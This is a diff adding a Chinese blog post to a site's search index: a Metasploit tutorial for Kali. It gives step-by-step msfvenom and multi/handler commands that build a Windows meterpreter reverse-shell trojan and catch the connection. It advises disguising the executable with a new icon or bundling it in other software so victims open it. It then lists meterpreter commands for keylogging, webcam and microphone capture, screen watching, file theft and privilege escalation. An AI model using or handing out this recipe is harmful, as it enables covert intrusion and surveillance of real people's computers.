@@ -7450,4 +7450,65 @@ ASL=\sum_{i=1}^{n}p_ic_i</script><p>n：记录的个数</p>
         <category>课程</category>
       </categories>
   </entry>
+  <entry>
+    <title>Kali使用msf演示</title>
+    <url>/post/4cf34f0f.html</url>
+    <content><![CDATA[<h1 id="1-什么是MSF"><a href="#1-什么是MSF" class="headerlink" title="1 什么是MSF"></a>1 什么是MSF</h1><p>Metasploit framework 简称msf，他是一个渗透测试平台，能够查找，利用和验证漏洞。</p>
+<p>Metasploit是一个免费的，可下载的框架，通过它可以很容易的对计算机软件漏洞实施攻击。它本身是附带数百个已知软件漏洞的专业级漏洞攻击工具。<span id="more"></span></p>
+<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220324-cb589f2d4af04031a121b69cfe7b77b7.png" alt="img"></p>
+<p>模块分为：</p>
+<p>辅助模块———————AUX</p>
+<p>渗透攻击模块————exploits</p>
+<p>后渗透攻击模块———post</p>
+<p>攻击载荷模块————-payloads</p>
+<p>编码器模块——————encoders</p>
+<p>空指令模块——————nops</p>
+<h1 id="2-基本使用方法"><a href="#2-基本使用方法" class="headerlink" title="2 基本使用方法"></a>2 基本使用方法</h1><ol>
+<li><p>在终端中输入<code>msfconsole</code>可以打开这个软件</p>
+<p>这里显示的是我们有多少个模块<img src="https://gitee.com/q1jy/images/raw/master/img/20220324-image-20220324110431455.png" alt="image-20220324110431455"></p>
+</li>
+<li><p>常用命令</p>
+<p>| 常用命令      | 作用                           |<br>| ——————- | ——————————————— |<br>| connect IP    | 远程连接主机，一般用于内网渗透 |<br>| show exploits | 列出框架中所有的攻击渗透模块   |<br>| search _<em>_</em>  | 条件搜索                       |</p>
+<p>比如<code>search ms17_010</code>搜索这个漏洞</p>
+<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220324-image-20220324203338674.png" alt="image-20220324203338674"></p>
+<p>rank是等级，按可靠性降序排列</p>
+<p>excellent——-great—good—-normal—-average—-low—-manual</p>
+</li>
+</ol>
+<h1 id="3-生成可执行木马"><a href="#3-生成可执行木马" class="headerlink" title="3 生成可执行木马"></a>3 生成可执行木马</h1><ol>
+<li><p>命令：<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=本地ip lport=本地端口号 -f exe -o 文件名.exe</code></p>
+<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220325-image-20220325120742191.png" alt="image-20220325120742191"></p>
+</li>
+<li><p><code>msfconsole</code>打开msf</p>
+</li>
+<li><p>配置参数</p>
+<p>(1)命令： <code>use exploit/multi/handler</code>（选择模块）</p>
+<p>(2)命令： <code>set payload windows/meterpreter/reverse_tcp</code>（选择攻击模块）</p>
+<p>(3)命令： <code>set LhOST 192.168.32.1</code>（填写自己主机的IP地址）</p>
+<p>(4)命令： <code>set lport 1111</code>（填写刚才生成文件时的端口号）</p>
+<p>(5)命令： <code>show options</code>（查看设置参数）</p>
+<p>(6)命令： <code>exploit -z -j</code>（后台执行）</p>
+<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220325-image-20220325121212843.png" alt="image-20220325121212843"></p>
+</li>
+<li><p>在靶机打开可执行文件</p>
+<p>这里可以把程序伪装一下，改一下图标，或者把它捆绑在某些软件上面，当用户打开就自动安装到对方电脑上</p>
+</li>
+<li><p>查看用户</p>
+<p>(1)命令：sessions（查看上钩用户）</p>
+<p>(2)命令：sessions -i 1（选择需要攻击的用户，这里选1）</p>
+<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220325-image-20220325121313086.png" alt="image-20220325121313086"></p>
+<p>出现meterpreter就已经成功了</p>
+</li>
+<li><p>meterpreter入侵对方电脑的命令</p>
+<p>(1)监控对方电脑屏幕</p>
+<p><code>run vnc -i</code></p>
+<p>(2)更多命令</p>
+<blockquote>
+<p>cmd指令:<br>cat 读取文件内容到屏幕<br>cd 更改目录<br>checksum 检索文件的校验和<br>cp 将源复制到目标<br>del 删除指定文件<br>dir 列出文件（ls 的别名）<br>下载 下载文件或目录<br>编辑 编辑文件<br>getlwd 打印本地工作目录<br>getwd 打印工作目录<br>lcd 更改本地工作目录<br>lls 列出本地文件<br>lpwd 打印本地工作目录<br>ls 列出文件<br>mkdir 创建目录<br>mv 将源移动到目标<br>pwd 打印工作目录<br>rm 删除指定文件<br>rmdir 删除目录<br>search 搜索文件<br>show_mount 列出所有挂载点/逻辑驱动器<br>upload 上传文件或目录<br>pkill 按名称终止进程</p>
+<p>meterpreter命令：<br>keyscan_start 开始捕获击键（开始键盘记录）<br>keyscan_dump 转储按键缓冲（下载键盘记录）<br>keyscan_stop 停止捕获击键（停止键盘记录）<br>record_mic X秒从默认的麦克风record_mic音频记录（音频录制）<br>webcam_chat 开始视频聊天（视频，对方会有弹窗）<br>webcam_list 单摄像头（查看摄像头列表）<br>webcam_snap 采取快照从指定的摄像头（摄像头拍摄一张照片）<br>webcam_stream 播放视频流从指定的摄像头（开启摄像头监控）<br>enumdesktops 列出所有可访问的桌面和窗口站（窗体列表）<br>getdesktop 得到当前的Meterpreter桌面<br>reboot 重新启动远程计算机<br>shutdown 关闭远程计算机<br>shell 放入系统命令 shell<br>enumdesktops 列出所有可访问的桌面和窗口站<br>getdesktop 获取当前的meterpreter桌面<br>idletime 返回远程用户空闲的秒数<br>keyboard_send 发送击键<br>keyevent 发送按键事件<br>keyscan_dump 转储击键缓冲区<br>keyscan_start 开始捕获击键<br>keyscan_stop 停止捕获击键<br>mouse 发送鼠标事件<br>screenshare 实时观看远程用户桌面<br>screenshot 抓取交互式桌面的屏幕截图<br>setdesktop 更改 Meterpreters 当前桌面<br>uictl 控制一些用户界面组件<br>record_mic 从默认麦克风录制音频 X 秒<br>webcam_chat 开始视频聊天<br>webcam_list 列出网络摄像头<br>webcam_snap 从指定的网络摄像头拍摄快照<br>webcam_stream 播放来自指定网络摄像头的视频流<br>play 在目标系统上播放波形音频文件 (.wav)<br>getsystem 尝试将您的权限提升到本地系统的权限<br>execute -f notepad 打开记事本</p>
+</blockquote>
+</li>
+</ol>
+]]></content>
+  </entry>
 </search>
